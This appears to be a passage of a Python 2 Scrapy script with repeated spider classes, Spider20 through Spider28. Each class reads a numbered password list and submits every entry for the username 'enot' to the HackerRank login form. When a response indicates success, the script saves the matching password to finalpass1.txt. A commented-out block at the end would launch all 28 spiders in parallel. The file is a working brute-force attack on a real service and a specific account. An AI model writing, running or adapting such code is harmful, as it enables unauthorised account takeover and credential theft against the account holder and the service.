			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

	













class Spider20(scrapy.Spider):
	name = "ta20"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "20.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ( (k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

	












class Spider21(scrapy.Spider):
	name = "ta21"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "21.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while (  (k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

	
















class Spider22(scrapy.Spider):
	name = "ta22"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "22.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ( (k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

	












class Spider23(scrapy.Spider):
	name = "ta23"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "23.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ( (k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b
 	











class Spider24(scrapy.Spider):
	name = "ta24"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "24.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ( (k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

 	










class Spider25(scrapy.Spider):
	name = "ta25"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "25.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ( (k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b













class Spider26(scrapy.Spider):
	name = "ta26"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "26.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ( (k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b










class Spider27(scrapy.Spider):
	name = "ta27"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "27.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ( (k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b















class Spider28(scrapy.Spider):
	name = "ta28"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	
	global passw
	passw= '-1'
	b=0
	#logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "28.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ( (k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b
		print c,
		





# process = CrawlerProcess()
# process.crawl(Spider1)
# process.crawl(Spider2)
# process.crawl(Spider3)
# process.crawl(Spider4)
# process.crawl(Spider5)
# process.crawl(Spider6)
# process.crawl(Spider7)
# process.crawl(Spider8)
# process.crawl(Spider9)
# process.crawl(Spider10)
# process.crawl(Spider11)
# process.crawl(Spider12)
# process.crawl(Spider13)
# process.crawl(Spider14)
# process.crawl(Spider15)
# process.crawl(Spider16)
# process.crawl(Spider17)
# process.crawl(Spider18)
# process.crawl(Spider19)
# process.crawl(Spider20)
# process.crawl(Spider21)
# process.crawl(Spider22)
# process.crawl(Spider23)
# process.crawl(Spider24)
# process.crawl(Spider25)
# process.crawl(Spider26)
# process.crawl(Spider27)
# process.crawl(Spider28)





# logging.getLogger('scrapy').setLevel(logging.INFO)

# #logger = logging.getLogger('scrapy')
# #logger.propagate = False
# process.start()
print "finished"










